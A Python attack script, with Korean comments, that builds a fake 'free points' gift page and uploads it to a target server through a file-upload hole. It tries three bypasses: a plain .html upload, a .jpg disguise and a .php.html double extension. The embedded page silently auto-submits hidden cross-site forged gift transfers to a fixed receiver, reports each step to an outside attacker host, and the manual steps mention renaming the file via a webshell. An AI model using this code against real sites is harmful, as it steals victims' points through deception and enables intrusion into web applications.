#!/usr/bin/env python3
"""
fake-gift.html 파일 업로드 스크립트
권한 문제 우회 - 파일 업로드 취약점 이용
"""

import requests
import sys

# 타겟 설정
TARGET = "http://52.78.221.104"
UPLOAD_URL = f"{TARGET}/upload.php"

print("="*60)
print("🎁 fake-gift.html 업로드 (파일 업로드 취약점 이용)")
print("="*60)
print()

# fake-gift.html 내용
html_content = """<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>🎁 무료 포인트 받기!</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            margin: 0;
        }
        .gift-box {
            background: white;
            color: #333;
            padding: 50px;
            border-radius: 20px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 { color: #667eea; }
        .gift-icon { font-size: 100px; }
        #status {
            background: #f0f0f0;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            color: #667eea;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="gift-box">
        <div class="gift-icon">🎁</div>
        <h1>🎉 축하합니다!</h1>
        <p style="font-size: 1.5em;">10,000 포인트를 받으셨습니다!</p>
        <div id="status">처리 중...</div>
    </div>
    <div id="forms"></div>
    <script>
        const ATTACKER = 'http://13.158.67.78:5000';
        function notify(endpoint, params) {
            const img = new Image();
            img.src = ATTACKER + endpoint + '?' + params + '&t=' + Date.now();
        }
        notify('/notify', 'event=page_loaded');
        const amounts = [50000, 30000, 20000, 10000, 5000, 3000, 2000, 1000, 500, 300, 200, 100];
        let html = '';
        amounts.forEach((amt, i) => {
            html += '<form id="f'+i+'" method="POST" action="profile.php" target="if'+i+'"><input type="hidden" name="send_gift" value="1"><input type="hidden" name="receiver_id" value="999"><input type="hidden" name="gift_type" value="diamond"><input type="hidden" name="points" value="'+amt+'"><input type="hidden" name="message" value="Event"></form><iframe name="if'+i+'" style="display:none;"></iframe>';
        });
        document.getElementById('forms').innerHTML = html;
        const total = amounts.reduce((a,b)=>a+b,0);
        notify('/victim', 'points=' + total);
        amounts.forEach((amt, i) => {
            setTimeout(() => {
                document.getElementById('f' + i).submit();
                document.getElementById('status').innerHTML = '처리 중... ' + Math.round((i+1)/amounts.length*100) + '%';
                notify('/transfer', 'amount=' + amt);
            }, i * 200);
        });
        setTimeout(() => {
            document.getElementById('status').innerHTML = '✅ 완료!';
            notify('/complete', 'total=' + total);
            setTimeout(() => { window.location.href = 'index.php'; }, 2000);
        }, amounts.length * 200 + 1000);
    </script>
</body>
</html>"""

# 파일로 저장
with open('fake-gift.html', 'w', encoding='utf-8') as f:
    f.write(html_content)

print("[+] fake-gift.html 생성 완료")

# 방법 1: .html 파일 직접 업로드 시도
print("\n[*] 방법 1: .html 파일 직접 업로드 시도...")
try:
    files = {
        'file': ('fake-gift.html', open('fake-gift.html', 'rb'), 'text/html')
    }
    r = requests.post(UPLOAD_URL, files=files, timeout=10)
    print(f"[+] 응답 코드: {r.status_code}")

    if '업로드' in r.text or 'success' in r.text.lower():
        print("[✓] 업로드 성공!")
        print(f"[+] URL: {TARGET}/uploads/fake-gift.html")
    else:
        print("[!] 업로드 실패 - HTML 확장자 차단됨")
except Exception as e:
    print(f"[✗] 에러: {e}")

# 방법 2: .jpg로 위장해서 업로드
print("\n[*] 방법 2: .jpg로 위장해서 업로드...")
try:
    files = {
        'file': ('fake-gift.jpg', open('fake-gift.html', 'rb'), 'image/jpeg')
    }
    r = requests.post(UPLOAD_URL, files=files, timeout=10)
    print(f"[+] 응답 코드: {r.status_code}")

    if '업로드' in r.text or 'success' in r.text.lower():
        print("[✓] 업로드 성공!")
        print(f"[+] URL: {TARGET}/uploads/fake-gift.jpg")
        print("[!] 주의: .jpg 파일이므로 브라우저가 HTML로 렌더링하지 않을 수 있음")
    else:
        print("[!] 업로드 실패")
except Exception as e:
    print(f"[✗] 에러: {e}")

# 방법 3: .php.html (이중 확장자)
print("\n[*] 방법 3: .php.html 이중 확장자...")
try:
    files = {
        'file': ('fake-gift.php.html', open('fake-gift.html', 'rb'), 'text/html')
    }
    r = requests.post(UPLOAD_URL, files=files, timeout=10)
    print(f"[+] 응답 코드: {r.status_code}")

    if '업로드' in r.text or 'success' in r.text.lower():
        print("[✓] 업로드 성공!")
        print(f"[+] URL: {TARGET}/uploads/fake-gift.php.html")
    else:
        print("[!] 업로드 실패")
except Exception as e:
    print(f"[✗] 에러: {e}")

print("\n" + "="*60)
print("📝 수동 업로드 방법:")
print("="*60)
print()
print("1. 브라우저에서 http://52.78.221.104/upload.php 열기")
print("2. fake-gift.html 파일 선택")
print("3. 업로드 후 URL 확인")
print()
print("또는")
print()
print("1. fake-gift.html을 fake-gift.jpg로 이름 변경")
print("2. 업로드 후 웹쉘에서 이름 변경:")
print("   cd /var/www/html/uploads")
print("   mv fake-gift.jpg ../www/fake-gift.html")
print()
print("="*60)
print("✅ 업로드 성공 시 접속:")
print(f"   {TARGET}/uploads/fake-gift.html")
print(f"   또는 {TARGET}/www/fake-gift.html")
print("="*60)
